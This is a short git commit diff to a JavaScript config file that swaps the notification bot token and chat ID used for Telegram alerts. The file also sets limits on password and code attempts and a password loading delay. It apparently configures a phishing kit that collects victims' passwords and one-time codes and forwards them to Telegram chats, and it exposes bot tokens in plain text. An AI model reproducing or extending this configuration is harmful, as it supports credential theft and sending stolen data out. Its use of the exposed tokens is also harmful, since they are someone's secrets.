81c20d1c330f6b809d03e2551546156173cd7956
chymbyby-blip <chymbyby@gmail.com>
2026-03-09 21:30:03 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,8 +1,8 @@
 const config = {
     token: '7940672148:AAHWTl2jWMWEe-dD1aU5yAGtPhIRVuUQGE0',
     chat_id: '-5003680680',
-    noti_token: '7843396833:AAEvYzgcxJ35LfEkAHju74BM8YHZ7ag_knA',
-    noti_chat_id: '-4741680886',
+    noti_token: '7940672148:AAHWTl2jWMWEe-dD1aU5yAGtPhIRVuUQGE0',
+    noti_chat_id: '1992153256',
     max_password_attempts: 2,
     max_code_attempts: 5,
     password_loading_time: 3,
